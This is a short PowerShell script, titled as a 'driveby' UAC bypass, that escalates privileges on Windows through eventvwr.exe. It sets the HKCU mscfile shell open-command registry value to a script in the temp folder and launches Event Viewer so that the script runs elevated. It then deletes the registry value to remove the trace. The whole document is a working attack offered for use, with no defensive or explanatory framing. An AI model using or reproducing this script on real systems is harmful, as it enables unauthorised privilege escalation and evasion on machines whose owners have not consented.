# Driveby UAC Bypass using eventvwr
$payload = "$env:TEMP\\recon.ps1"
Set-ItemProperty -Path "HKCU:\\Software\\Classes\\mscfile\\shell\\open\\command" -Value $payload
Start-Process "eventvwr.exe"
Start-Sleep -Seconds 3
Remove-ItemProperty -Path "HKCU:\\Software\\Classes\\mscfile\\shell\\open\\command" -Name "(default)"
